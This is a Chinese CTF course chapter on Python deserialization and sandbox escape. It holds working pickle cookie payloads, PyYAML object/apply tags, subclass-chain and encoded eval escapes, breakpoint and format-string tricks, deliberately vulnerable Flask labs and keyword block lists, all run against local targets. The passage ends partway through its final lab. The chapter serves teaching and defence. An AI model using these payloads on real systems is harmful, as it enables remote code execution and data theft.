---
chapter: Web安全
section: Python 反序列化与沙箱逃逸
order: 615
tags:
  - CTF
  - Web安全
  - pickle
  - 沙箱逃逸
  - Flask
publish: true
---

# W15 Python 反序列化与沙箱逃逸
## Python Deserialization & Sandbox Escape

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L3 进阶期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W09-SSTI|W09]] · [[W12-PHP反序列化|W12]]
> **本章目标**：在 [[11-Web安全版图与Burp#3.8 反序列化：恢复对象的那一行就是执行点|11 章 3.8]] 的 `__reduce__` 最小演示之上补全 pickle 机制（协议版本、返回值语义、opcode、手写字节码）；把 pickle cookie、YAML、受限 eval、Flask session 四类"数据变代码"的入口各配一个自建靶场与逐级攻防记录；能按"受限 Unpickler、safe_load、AST 白名单、强随机 SECRET_KEY"四条线布防。

> [!note] 本章的实验约定
> 三个自建靶场监听 `127.0.0.1` 的 9501/9502/9503 端口，flag 统一放在靶场工作目录的 `flag.txt`；Python 示例按 3.14 的行为记录，PyYAML 按 6.0.x 的行为记录，版本差异在正文注明。curl 统一带 `--noproxy '*'`：系统代理常驻时，回环地址的请求也可能被代理拦改（[[11-Web安全版图与Burp|11 章]]常见问题里有这个现象），该参数让 curl 直连靶机。

## 1. pickle 机制深化

[[11-Web安全版图与Burp#3.8 反序列化：恢复对象的那一行就是执行点|11 章 3.8]] 用 `__reduce__` 给了 pickle 反序列化漏洞的最小形态：类里返回什么调用，`loads()` 就执行什么调用。本节把 pickle 本身补全——协议版本、返回值语义、字节码——之后的所有 Web 场景都建立在这些机制上。

### 1.1 协议版本

`pickle.dumps()` 可指定 `protocol` 参数。六个协议一表看完：

| 协议 | 引入 | 特征 |
| ---- | ---- | ---- |
| 0 | 最早 | 文本协议，opcode 是可读字符（1.4 手写字节码就用它） |
| 1 | 早期 | 二进制格式 |
| 2 | Python 2.3 | 新式类支持，BUILD 等恢复状态的 opcode |
| 3 | Python 3.0 | bytes 字面量 |
| 4 | Python 3.4（PEP 3154） | FRAME 帧、memo 复用、大对象支持 |
| 5 | Python 3.8（PEP 574） | 带外缓冲（`buffer_callback`） |

```python
# 01_pickle_basics.py —— 协议版本与 __reduce__ 语义
import pickle
import sys
import os

print("python:", sys.version.split()[0])
print("DEFAULT_PROTOCOL =", pickle.DEFAULT_PROTOCOL)
print("HIGHEST_PROTOCOL =", pickle.HIGHEST_PROTOCOL)

class Exp:
    def __reduce__(self):
        return os.system, ("id > /dev/null",)

for proto in range(0, pickle.HIGHEST_PROTOCOL + 1):
    b = pickle.dumps(Exp(), protocol=proto)
    print("proto %d: %3d bytes | %s" % (proto, len(b), b[:32]))
```

输出：

```
python: 3.14.4
DEFAULT_PROTOCOL = 5
HIGHEST_PROTOCOL = 5
proto 0:  46 bytes | b'cposix\nsystem\np0\n(Vid > /dev/nul'
proto 1:  45 bytes | b'cposix\nsystem\nq\x00(X\x0e\x00\x00\x00id > /dev/'
proto 2:  46 bytes | b'\x80\x02cposix\nsystem\nq\x00X\x0e\x00\x00\x00id > /dev'
proto 3:  46 bytes | b'\x80\x03cposix\nsystem\nq\x00X\x0e\x00\x00\x00id > /dev'
proto 4:  52 bytes | b'\x80\x04\x95)\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x0e'
proto 5:  52 bytes | b'\x80\x05\x95)\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x0e'
```

==Python 3.14 里默认协议与最高协议都是 5==。对漏洞利用而言，协议差异只是字节形态不同：==payload 的攻击语义与协议版本无关，`loads()` 不可信数据永远等于代码执行==。兼容性上要记一条：低版本解释器读到高协议字节流会抛 `ValueError: unsupported pickle protocol`——同一份 payload 打不同版本的靶，先确认对方的协议上限。

### 1.2 `__reduce__` 的返回值语义

`__reduce__` 的返回值是一个元组，各位置语义固定：

```python
# 01_pickle_basics.py（续）—— 返回值的三种形态
ret = pickle.loads(pickle.dumps(Exp()))
print("loads 返回值:", ret, "（os.system 的返回码）")

class Box:
    def __reduce__(self):
        return self.__class__, (), {"v": 41}
    def __setstate__(self, state):
        self.__dict__.update(state)
        self.v += 1

box = pickle.loads(pickle.dumps(Box()))
print("Box.v =", box.v)

class Ex2:
    def __reduce_ex__(self, proto):
        return print, ("reduce_ex 被调用，协议 =", proto)

pickle.loads(pickle.dumps(Ex2()))
```

输出：

```
loads 返回值: 0 （os.system 的返回码）
Box.v = 42 （41 经 BUILD 进 __setstate__ 后 +1）
reduce_ex 被调用，协议 = 5
```

三条要点：

- **`(callable, args)`**：loads 时执行 `callable(*args)`，==返回值就是这次调用的返回值==——上面的 0 是 `os.system` 的返回码；
- **`(callable, args, state)`**：第三位 state 经 BUILD opcode 交给 `__setstate__`（类没定义就写进 `__dict__`）。对照 W12 的 PHP：`__wakeup` 一族魔术方法在 pickle 里对应的就是这一族，思想同源（[[W12-PHP反序列化#3.1 原理：面向属性编程|W12 3.1]] 的"只控制属性，不注入代码"在 pickle 里同样成立）；
- **`dumps()` 实际调用的是 `__reduce_ex__(protocol)`**，`__reduce__` 只是 object 提供的兜底实现——==重写 `__reduce_ex__` 同样可控==，上例第三段就是它拿到了协议号。

> [!info]- 五元组与六元组
> `__reduce__` 还可以返回五元组 `(callable, args, state, listitems, dictitems)` 或六元组（末位是 state_setter，3.8 加入）：listitems/dictitems 是迭代器，恢复时逐项 append 进对象。CTF 场景里二元组与三元组覆盖绝大多数情况。

> [!warning] payload 不需要服务端存在任何类
> `__reduce__` 的返回值落进字节流后只剩"模块名 + 函数名 + 参数"三样东西。==服务端哪怕没定义过 Exploit 这个类，甚至根本不知道它存在，payload 照样执行==。这是反序列化漏洞与代码注入的根本区别：注入的是一条调用链，不是代码本身。

### 1.3 pickletools.dis：opcode 对照

[[11-Web安全版图与Burp#3.8 反序列化：恢复对象的那一行就是执行点|11 章 3.8]] 贴过一段 `pickletools.dis` 的输出。把常见 opcode 收成对照表：

| opcode | 作用 |
| ------ | ---- |
| PROTO | 声明协议版本 |
| FRAME | 帧边界（协议 4+），供增量读取 |
| SHORT_BINUNICODE / BINUNICODE | 压入字符串（短 / 长两种长度编码） |
| STACK_GLOBAL | 弹出两个字符串当模块名、属性名，压入 `module.attr` 引用 |
| GLOBAL | STACK_GLOBAL 的文本形态（协议 0/1），按两行读模块名与属性名 |
| MEMOIZE | 把栈顶对象存入 memo 表，供后续按编号复用 |
| TUPLE / TUPLE1 / TUPLE2 | 从栈上收集元素构成元组 |
| REDUCE | 弹出 args 与 callable，执行 `callable(*args)`，返回值压回 |
| BUILD | 弹出 state 与对象，按 `__setstate__`（缺省写 `__dict__`）恢复状态 |
| STOP | 结束 |

STACK_GLOBAL 的语义值得单独写一句：==按字符串 import 模块、按属性名取对象==。反序列化器内置了一条 import 语句，模块名和属性名都由字节流提供。

> [!note] GLOBAL 解析失败长什么样
> 模块不存在或属性不存在时，loads 抛 `ModuleNotFoundError` / `AttributeError`。所以 payload 的可引用面取决于靶机的 Python 环境——`posix`、`builtins`、`os` 这类随解释器自带的模块最稳。

### 1.4 手写字节码拼最小 payload

有了 opcode 表，payload 可以不经过任何类，直接用字节拼出来。协议 0 是文本协议，opcode 全是单字符，最适合手工构造：

```python
# 02_pickle_opcode.py —— 手写字节码拼最小 payload（protocol 0）
import pickle
import pickletools

open("flag.txt", "w").write("flag{bytec0de_by_h4nd}\n")

# c GLOBAL  压入 module.attr（读两行：模块名、属性名，都到换行为止）
# ( MARK    压入栈标记
# S STRING  压入带引号字符串（读一行）
# t TUPLE   从栈顶收集到 MARK 为止，构成元组压回
# R REDUCE  弹出 args 与 callable，执行 callable(*args)
payload = b"cposix\nsystem\n(S'cat flag.txt'\ntR."

print("---- pickletools.dis ----")
pickletools.dis(payload)
print("---- pickle.loads ----")
print("返回值:", pickle.loads(payload))
```

输出：

```
---- pickletools.dis ----
    0: c    GLOBAL     'posix system'
   14: (    MARK
   15: S        STRING     'cat flag.txt'
   31: t        TUPLE      (MARK at 14)
   32: R    REDUCE
   33: .    STOP
highest protocol among opcodes = 0
---- pickle.loads ----
flag{bytec0de_by_h4nd}
返回值: 0
```

33 字节的字符序列，效果与 11 章 3.8 那个类完全相同。手工构造的价值在两类场景：一是把 payload 压到最短（有的靶对 cookie 或字段长度有限制）；二是绕开"必须能在自己机器上构造出那个对象"的前提——拼字节不需要任何 import。读 dis 时盯住栈：GLOBAL 压入可调用对象，MARK 划出边界，S 压入参数，t 收成元组，R 触发调用，`.` 结束。

## 2. Web 里的 pickle 入口：cookie 靶

11 章 3.8 说"cookie 里塞 base64 的 pickle 就是真实世界的形态"。本节把这句话做成完整靶场并打穿。靶场（9501 端口）模拟一个"记住用户偏好"的功能：服务端把偏好对象序列化进 cookie，下次访问原样恢复。

```python
# pickle_app.py —— pickle cookie 靶（9501 端口）
from flask import Flask, request, make_response
import base64
import pickle

app = Flask(__name__)

class Pref:
    def __init__(self, theme="light", note=""):
        self.theme = theme
        self.note = note

@app.get("/")
def index():
    raw = request.cookies.get("pref")
    if not raw:
        p = Pref()
        resp = make_response("[pref] 首次访问，已下发默认偏好\n")
        resp.set_cookie("pref", base64.b64encode(pickle.dumps(p)).decode())
        return resp
    p = pickle.loads(base64.b64decode(raw))           # 执行点
    if isinstance(p, Pref):
        return "[pref] theme=%s note=%s\n" % (p.theme, p.note)
    return "[pref] %s\n" % (p,)                        # loads 的返回值直接回显

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=9501)
```

漏洞就是结构本身：`pickle.loads()` 吃的是客户端可控的 cookie，前后没有任何完整性校验。先走一遍正常流，看服务端发的 cookie 长什么样：

```bash
curl -si --noproxy '*' 'http://127.0.0.1:9501/' | tr -d '\r' | grep -iE '^(HTTP|set-cookie)'
```

输出：

```
HTTP/1.1 200 OK
Set-Cookie: pref=gAWVNwAAAAAAAACMCF9fbWFpbl9flIwEUHJlZpSTlCmBlH2UKIwFdGhlbWWUjAVsaWdodJSMBG5vdGWUjACUdWIu; Path=/
```

cookie 值 base64 解开，开头是 `\x80\x05`——协议 5 的 pickle 流，内容是 `__main__.Pref` 对象。==base64 解开以 `\x80` 开头，就是 pickle 的指纹==，识别方法与 W12 里认 `O:4:"User"` 的 PHP 序列化头一致。

### 2.1 构造两枚恶意 cookie

一枚盲打（`os.system` 只留副作用，不带输出），一枚带回显（`eval` 的返回值正好被页面打印）：

```python
# exploit_gen.py —— 生成两枚恶意 cookie
import base64
import os
import pickle
import pickletools

class Blind:
    def __reduce__(self):
        return os.system, ("touch /tmp/w15_pwned",)

class Echo:
    def __reduce__(self):
        return eval, ("__import__('os').popen('cat flag.txt').read()",)

blind = base64.b64encode(pickle.dumps(Blind())).decode()
echo_raw = pickle.dumps(Echo())
pickletools.dis(echo_raw)
echo = base64.b64encode(echo_raw).decode()
```

输出（Echo 的字节码，`highest protocol among opcodes = 4` 一行略）：

```
    0: \x80 PROTO      5
    2: \x95 FRAME      73
   11: \x8c SHORT_BINUNICODE 'builtins'
   21: \x94 MEMOIZE    (as 0)
   22: \x8c SHORT_BINUNICODE 'eval'
   28: \x94 MEMOIZE    (as 1)
   29: \x93 STACK_GLOBAL
   30: \x94 MEMOIZE    (as 2)
   31: \x8c SHORT_BINUNICODE "__import__('os').popen('cat flag.txt').read()"
   78: \x94 MEMOIZE    (as 3)
   79: \x85 TUPLE1
   80: \x94 MEMOIZE    (as 4)
   81: R    REDUCE
   82: \x94 MEMOIZE    (as 5)
   83: .    STOP
```

对照 1.3 的表读：`builtins` 与 `eval` 两个字符串经 STACK_GLOBAL 变成 eval 函数本体，参数字符串进 TUPLE1，REDUCE 触发调用。==盲打选 `os.system`，回显选 `eval`==——eval 的返回值（popen 读到的内容）就是 loads 的返回值，正好落进靶子的 `%s`。命令本身要输出时走 `popen().read()`，这与 [[W05-命令注入与代码执行|W05]] 里"执行函数族怎么选"是同一件事。

两枚 cookie 的值：

```
blind: gAWVLwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBR0b3VjaCAvdG1wL3cxNV9wd25lZJSFlFKULg==
echo : gAWVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IGZsYWcudHh0JykucmVhZCgplIWUUpQu
```

### 2.2 打靶

```bash
curl -s --noproxy '*' -b 'pref=gAWVLwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBR0b3VjaCAvdG1wL3cxNV9wd25lZJSFlFKULg==' \
  'http://127.0.0.1:9501/'
test -f /tmp/w15_pwned && echo "pwned 文件已落盘"
curl -s --noproxy '*' -b 'pref=gAWVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IGZsYWcudHh0JykucmVhZCgplIWUUpQu' \
  'http://127.0.0.1:9501/'
```

输出：

```
[pref] 0
pwned 文件已落盘
[pref] flag{bytec0de_by_h4nd}
```

第一发页面只回了 `[pref] 0`：os.system 的返回码被打印，命令本身的输出留在服务端，靠 `/tmp` 下多出的文件确认执行成功。第二发 eval 把 flag 读回来当返回值，直接进了页面。==同一个 `pickle.loads()`，换个函数名就是"盲打"与"回显"的差别==。

### 2.3 其他落点

pickle 的入口不止 cookie。Flask-Session 这类服务端 session 扩展把 session 内容 pickle 后写进 Redis 或文件，凡是能影响存储内容的输入（塞进 session 的 user-agent、Redis 的键名）都能把不可信字节流送到 `loads()` 面前；缓存层（Redis/Memcached 里存 pickle 过的对象）、任务队列（Celery 默认用 pickle 序列化任务参数）、多进程通信（multiprocessing）都是同一模式。识别方法一致：==base64 解开开头是 `\x80`，或流量里出现 `\x80\x04`、`\x80\x05`，就按本章流程处理==。

## 3. YAML 反序列化：load 与 safe_load 的分界

PyYAML 的标签系统允许把 YAML 节点映射到 Python 对象，`!!python/object/apply:os.system ["cmd"]` 这类标签就是执行点。这一节的结论以 PyYAML 6.0.x 为准——旧文章流传的"yaml.load = RCE"在今天要补一个版本前提。

### 3.1 版本纠偏

| PyYAML 版本 | `yaml.load()` 不带 Loader 的行为 |
| ----------- | -------------------------------- |
| < 5.1 | 默认全对象 Loader，直接可 RCE——旧结论的出处 |
| 5.1 – 5.x | 发出警告，默认改为 FullLoader（受限） |
| ≥ 6.0 | 直接 TypeError，Loader 必须显式传 |

```python
# yaml_matrix.py —— PyYAML 6.0.3 的行为：便捷入口与 Loader 行为矩阵
import yaml

print("PyYAML", yaml.__version__)
try:
    yaml.load("a: 1")
except TypeError as e:
    print("yaml.load('a: 1') -> TypeError:", e)

print("safe_load  ->", yaml.safe_load("a: 1"))
print("full_load  ->", yaml.load("a: 1", Loader=yaml.FullLoader))
print("unsafe_load->", yaml.load("a: 1", Loader=yaml.UnsafeLoader))
```

输出：

```
PyYAML 6.0.3
yaml.load('a: 1') -> TypeError: load() missing 1 required positional argument: 'Loader'
safe_load  -> {'a': 1}
full_load  -> {'a': 1}
unsafe_load-> {'a': 1}
```

三个便捷入口对应三档 Loader：`safe_load` → SafeLoader，`full_load` → FullLoader，`unsafe_load` → UnsafeLoader（旧版本 Loader 参数的别名，全开）。==今天看到"yaml.load 会 RCE"的资料，先补上版本前提再下结论==。

### 3.2 各 Loader 的行为矩阵

三个 python 系标签对三种 Loader 各打一发：

```python
# yaml_matrix.py（续）—— python 系标签 × 三种 Loader
import functools as _fp
import os
import yaml

print = _fp.partial(print, flush=True)   # 子进程直写 stdout，先关掉缓冲保住输出顺序

payloads = [
    ("apply 调函数", "!!python/object/apply:os.system ['touch /tmp/y15_apply_rce']"),
    ("name 取函数", "!!python/name:os.system"),
    ("new 带参构造", "!!python/object/new:os.system ['id']"),
]
loaders = [("SafeLoader", yaml.SafeLoader),
           ("FullLoader", yaml.FullLoader),
           ("UnsafeLoader", yaml.UnsafeLoader)]

os.system("rm -f /tmp/y15_apply_rce")
for pname, ptext in payloads:
    print("==", pname)
    for lname, loader in loaders:
        try:
            r = yaml.load(ptext, Loader=loader)
            print("  %-12s -> %r" % (lname, r))
        except Exception as e:
            print("  %-12s -> %s" % (lname, type(e).__name__))

print("apply 落盘文件存在:", os.path.exists("/tmp/y15_apply_rce"))
```

输出（`id` 的输出行穿插在两次打印之间，flush 已保住顺序）：

```
== apply 调函数
  SafeLoader   -> ConstructorError
  FullLoader   -> ConstructorError
  UnsafeLoader -> 0
== name 取函数
  SafeLoader   -> ConstructorError
  FullLoader   -> <built-in function system>
  UnsafeLoader -> <built-in function system>
== new 带参构造
  SafeLoader   -> ConstructorError
  FullLoader   -> ConstructorError
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
  UnsafeLoader -> 0
apply 落盘文件存在: True
```

收成矩阵：

| 标签 | SafeLoader | FullLoader | UnsafeLoader |
| ---- | ---------- | ---------- | ------------ |
| `!!python/object/apply`（调用函数） | 拒绝 | 拒绝 | 执行 |
| `!!python/object/new`（带参构造） | 拒绝 | 拒绝 | 执行 |
| `!!python/name`（取函数对象，不调用） | 拒绝 | 返回函数 | 返回函数 |

三条结论：

- SafeLoader 认不出任何 python 标签——==外部配置一律 `safe_load`==；
- FullLoader 挡住了"调用"，没挡住"取值"：`python/name` 能把函数对象取进数据。5.1 刚引入时它还被披露过绕过链，后续版本逐步收紧，==把 FullLoader 用在不可信输入上，赌的是引擎版本的时效==；
- UnsafeLoader 全开，`!!python/object/apply` 直接执行、`!!python/object/new` 直接构造（`new` 那发里穿插的 `uid=` 行就是它执行的 `id`）——等于把 5.1 之前的 `yaml.load()` 请了回来。

> [!info]- 拒绝时报错长什么样
> SafeLoader / FullLoader 拒绝 python 标签时抛 `ConstructorError`，全文是 `could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/apply'`。打靶时见到这行说明 Loader 档位判断对了，攻击面要么换 UnsafeLoader，要么对象是运行在 5.1 之前版本的旧服务。

## 4. eval/exec 沙箱逃逸

[[W09-SSTI#6. 沙箱逃逸入门|W09 第 6 节]]讲过 jinja2 沙箱的结论：SandboxedEnvironment 把下划线开头的属性判为不安全，访问结果替换成触发 SecurityError 的占位值，第 4 节那条利用链第一步就被掐断。Python 还有一类更裸的"沙箱"：应用代码自己把 `eval()` / `exec()` 的环境抠掉一块，再把用户输入放进去。没有引擎替你把关，逃逸就是和过滤规则正面博弈。

先把"给 eval 加限制"的两个旋钮摆出来，逃逸技术按旋钮对号入座：

| 靶子做的限制 | 对应的逃逸技术 |
| ------------ | -------------- |
| 什么都不做 | `__import__('os').popen(...)` 直达 |
| `__builtins__` 清空（`eval(expr, {"__builtins__": {}})`） | object 子类链找回 os 的引用 |
| 再叠关键字黑名单（import/os/system…） | 字符串拼接、getattr 链、编码 |
| 进程 stdin 可达 | `breakpoint()` 交互逃逸 |
| `str.format` 的格式串可控 | 格式化字符串取值（[[11-Web安全版图与Burp#4.2 Python 的坑\|11 章 4.2]]） |
| 语法树白名单（AST 检查） | ——（4.6：这条线是防御） |

### 4.1 清空 `__builtins__` 不等于封死

`eval()` 的第二个参数给出全局命名空间，`{"__builtins__": {}}` 让表达式里没有 `len`、`__import__`、`open` 可用。但 Python 的类型系统不依赖 builtins：任何对象都能顺着 `__class__ → __base__ → __subclasses__()` 走到 object，而 object 的全部子类里==总有装着 os 模块引用的==——`os._wrap_close` 是 subprocess 的内部包装类，它的 `__init__.__globals__` 就是 os 模块的全局命名空间。链条固定三步：

1. 从任意对象走到 object：`().__class__.__base__`（写 `__bases__[0]` 是同一回事）；
2. `__subclasses__()` 列出全部子类，按 `__name__` 过滤出 `_wrap_close`；
3. `.__init__.__globals__` 拿到 os 模块的全局命名空间，`popen`、`system` 随取随用。

```python
# eval_lab.py —— 受限 eval 绕过阶梯（逐级演示）
import base64
import functools

print = functools.partial(print, flush=True)

# L1：__builtins__ 清空 → 子类链
env = {"__builtins__": {}}
expr = ("[c for c in ().__class__.__base__.__subclasses__() "
        "if c.__name__ == '_wrap_close'][0]"
        ".__init__.__globals__['popen']('id').read().strip()")
print("[L1 无 builtins]", eval(expr, env))

subs = ().__class__.__base__.__subclasses__()
names = [c.__name__ for c in subs]
print("[subclasses] 类总数:", len(subs), "| _wrap_close 下标:", names.index("_wrap_close"))
```

输出：

```
[L1 无 builtins] uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
[subclasses] 类总数: 260 | _wrap_close 下标: 167
```

> [!warning] 子类下标随版本漂移，按类名过滤
> 老题解常用 `__subclasses__()[167]` 这种按下标取类的写法。子类列表的内容取决于解释器版本与进程里 import 过哪些模块，==同一个下标换一个环境就是另一个类==——上面输出里的 167 只对产生这份输出的进程有意义。稳态写法永远是列表推导式按 `__name__` 过滤。

### 4.2 关键字黑名单与字符串拼接

黑名单按子串匹配 `import`、`os`、`system`、`popen` 这类词，那就不让这些字面量整体出现——运行时拼接绕过：

```python
# eval_lab.py（续）—— L2：无 builtins + 字面量黑名单
env = {"__builtins__": {}}
expr = ("[c for c in ().__class__.__base__.__subclasses__() "
        "if c.__name__ == '_wrap_' + 'close'][0]"
        ".__init__.__globals__['po' + 'pen']('cat flag.txt').read().strip()")
print("[L2 字符串拼接]", eval(expr, env))
```

输出：

```
[L2 字符串拼接] flag{bytec0de_by_h4nd}
```

与 4.1 的链相比只改了两处：`'_wrap_'+'close'` 与 `'po'+'pen'`。==黑名单拦的是源码里的字面量，拦不住运行时拼出来的串==。

> [!warning] 黑名单按子串匹配会误伤自己
> 想把 `os` 也列进黑名单时要小心：`close`、`lose`、`ose` 里都藏着连续的 `os`——上一节的标准链在 `'_wrap_close'` 处就会被自己的黑名单拦下。黑名单要么按词边界匹配，要么接受"攻击者把字符拆开"的现实；后者正是 4.6 换 AST 白名单的理由。

### 4.3 编码绕过与 getattr 链

另一种常见靶型：builtins 完整，源码过黑名单（靶子想保留 eval 的计算能力，只滤危险词）。编码把敏感词整个藏进字节：

```python
# eval_lab.py（续）—— L3：builtins 在，词被滤
def run(expr):
    for w in ("import", "os", "system", "popen", "open"):
        if w in expr:
            return "[blocked] 命中黑名单: " + w
    return str(eval(expr))

src = '__import__("os").popen("cat flag.txt").read()'
enc = base64.b64encode(src.encode()).decode()
print("[L3 编码绕过] base64 =", enc)
print("[L3 对照 base64+exec]", run("exec(__import__('base64').b64decode('%s').decode())" % enc))
print("[L3 hex+eval]", run("eval(bytes.fromhex('%s').decode())" % src.encode().hex()))
```

输出：

```
[L3 编码绕过] base64 = X19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IGZsYWcudHh0IikucmVhZCgp
[L3 对照 base64+exec] [blocked] 命中黑名单: import
[L3 hex+eval] flag{bytec0de_by_h4nd}
```

经典形态 `exec(__import__('base64').b64decode('...').decode())` 自己带着 `import` 字样，先被黑名单拦下；换成 `bytes.fromhex` 就一个敏感词都不剩——hex 解出的正是 `__import__("os").popen(...)`，交给 eval 执行。==编码不改变语义，只改变黑名单能不能看见==。

getattr 链更干净，连敏感词的"名字"都不出现，全部运行时拼出来：

```python
# eval_lab.py（续）—— L4：getattr 链
expr = ("getattr(getattr(__builtins__, '__im' + 'port__')('o' + 's'),"
        " 'pop' + 'en')('cat flag.txt').read().strip()")
print("[L4 getattr 链]", run(expr))
```

输出：

```
[L4 getattr 链] flag{bytec0de_by_h4nd}
```

### 4.4 `breakpoint()`：stdin 可达时的交互逃逸

`breakpoint()` 是 builtins 里的普通函数，eval 表达式可以直接调用；它启动 pdb，而 pdb 能执行任意 Python 语句——==黑名单过滤的是表达式里的词，管不到调试器里敲的语句==。前提是靶子进程的 stdin 可达：本地命令行靶成立；HTTP 靶上 pdb 会去读服务进程的 stdin，通常不可达或把 worker 挂住。

```python
# breakpoint_lab.py —— 表达式过词表，但 builtins 完整
def check(expr):
    for w in ("import", "os", "system", "popen", "open", "subprocess"):
        if w in expr:
            return "[blocked] 命中黑名单: " + w
    return eval(expr)

print("result:", check("breakpoint()"))
```

stdin 是管道也能喂 pdb：把要执行的语句和放行命令从标准输入灌进去。

```bash
printf 'import os; os.system("id")\nc\n' | python3 breakpoint_lab.py
```

输出：

```
> <string>(1)<module>()
(Pdb) uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
0
(Pdb) result: None
```

`> <string>(1)<module>()` 是 pdb 的停点提示；第一行灌入的语句在 pdb 里执行，`uid=` 行是 `os.system("id")` 的输出，`0` 是 pdb 回显的语句求值结果（os.system 的返回码）；`c` 放行后脚本自己打印 `result: None`（`breakpoint()` 的返回值）。`breakpoint` 不在任何词表里，表达式中规中矩，逃逸发生在"过滤之后"的调试器里。

> [!info]- help() 与分页器
> `help()` 进入 pydoc 的交互帮助，输出长文档时会调用 less 一类分页器，而 less 里输入 `!命令` 可以执行 shell。这条路要求靶子在真实终端（tty）里运行——分页器只在 tty 下启用，管道环境下 pydoc 直接输出纯文本，逃逸不成立。遇到"能交互、函数全被禁"的场景时，把它记在备选里。

> [!note] PYTHONBREAKPOINT=0
> `breakpoint()` 的行为受环境变量 PYTHONBREAKPOINT 控制，设为 `0` 时退化为空操作。加固侧可以用它一键禁用；打靶时 breakpoint 没反应，先查这个变量。

### 4.5 格式化字符串：只取值，不调用

`str.format` 的字段语法支持属性访问与按键访问（[[11-Web安全版图与Burp#4.2 Python 的坑|11 章 4.2]] 提过它的轻量沙箱属性）。靶子模式是 `("{" + 用户输入 + "}").format(obj)`——写不了调用，但能顺着 obj 摸进定义它的模块全局：

```python
# format_lab.py —— 格式串可控的靶面
FLAG = "flag{f0rmat_l34k}"

class Ctx:
    def __init__(self):
        self.x = 1

print("{0.__class__.__init__.__globals__[FLAG]}".format(Ctx()))
```

输出：

```
flag{f0rmat_l34k}
```

字段 `0.__class__.__init__.__globals__[FLAG]` 逐段读：0 号参数的类 → 它的 `__init__`（Ctx 自己定义的，是 Python 函数，带 `__globals__`）→ 定义所在模块的全局命名空间 → 按 key 取 FLAG。注意两点：`__init__` 必须是 Python 层定义的函数才有 `__globals__`（object 自带的槽包装没有）；==format 串只有取值能力，拿得到引用、做不了调用==——所以它的产出通常是信息（flag、配置项、SECRET_KEY），或者为下一次 eval 提供一个名字。jinja2 沙箱对 `format` / `format_map` 做了专门包装（W09 第 6 节），裸 Python 的 `str.format` 没有这层检查。

### 4.6 HTTP 靶组：四级攻防记录

把上述技术装进一个 HTTP 靶（9502 端口）。前三级逐级叠限制，第四级换成 AST 白名单：

```python
# eval_app.py —— 受限 eval 靶组（9502 端口）
from flask import Flask, request
import ast

app = Flask(__name__)

BLOCK = ["import", "system", "popen", "open", "eval", "exec",
         "breakpoint", "builtins", "getattr", "vars", "locals",
         "compile", "input", "help", "subprocess"]


def show(expr, value):
    return "[ok] %s\n" % (value,)


@app.get("/l0")
def l0():
    expr = request.args["expr"]
    try:
        return show(expr, eval(expr))
    except Exception as e:
        return "[error] %s: %s\n" % (type(e).__name__, e)


@app.get("/l1")
def l1():
    expr = request.args["expr"]
    try:
        return show(expr, eval(expr, {"__builtins__": {}}))
    except Exception as e:
        return "[error] %s: %s\n" % (type(e).__name__, e)


@app.get("/l2")
def l2():
    expr = request.args["expr"]
    hits = [w for w in BLOCK if w in expr]
    if hits:
        return "[blocked] 命中黑名单: %s\n" % hits
    try:
        return show(expr, eval(expr, {"__builtins__": {}}))
    except Exception as e:
        return "[error] %s: %s\n" % (type(e).__name__, e)


ALLOW_NODES = (ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant, ast.Load,
               ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv, ast.Mod,
               ast.Pow, ast.USub, ast.UAdd)


@app.get("/l3")
def l3():
    expr = request.args["expr"]
    try:
        tree = ast.parse(expr, mode="eval")
    except SyntaxError as e:
        return "[blocked] 不是合法表达式: %s\n" % e
    for node in ast.walk(tree):
        if not isinstance(node, ALLOW_NODES):
            return "[blocked] 节点不在白名单: %s\n" % type(node).__name__
        if isinstance(node, ast.Constant) and not isinstance(node.value, (int, float)):
            return "[blocked] 常量只允许数字\n"
    try:
        return show(expr, eval(compile(tree, "<expr>", "eval"), {"__builtins__": {}}))
    except Exception as e:
        return "[error] %s: %s\n" % (type(e).__name__, e)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=9502)
```

前三级的 payload 与结果（`--data-urlencode` 负责把表达式整体 URL 编码）：

```bash
curl -sG --noproxy '*' \
  --data-urlencode "expr=__import__('os').popen('cat flag.txt').read()" \
  'http://127.0.0.1:9502/l0'
curl -sG --noproxy '*' \
  --data-urlencode "expr=[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['popen']('cat flag.txt').read()" \
  'http://127.0.0.1:9502/l1'
curl -sG --noproxy '*' \
  --data-urlencode "expr=[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_'+'close'][0].__init__.__globals__['po'+'pen']('cat flag.txt').read()" \
  'http://127.0.0.1:9502/l2'
curl -sG --noproxy '*' \
  --data-urlencode "expr=__import__('os')" \
  'http://127.0.0.1:9502/l2'
```

输出：

```
[ok] flag{bytec0de_by_h4nd}
[ok] flag{bytec0de_by_h4nd}
[ok] flag{bytec0de_by_h4nd}
[blocked] 命中黑名单: ['import']
```

L0 直达；L1 清空 builtins 后走子类链；L2 在 L1 的链上做两处拼接就过了黑名单，直写敏感词的对照请求被当场拦下。四级的前三级全部打穿。

第四级 `/l3` 换了思路——不看词，看语法树。三发 payload：

```bash
curl -sG --noproxy '*' --data-urlencode "expr=().__class__" 'http://127.0.0.1:9502/l3'
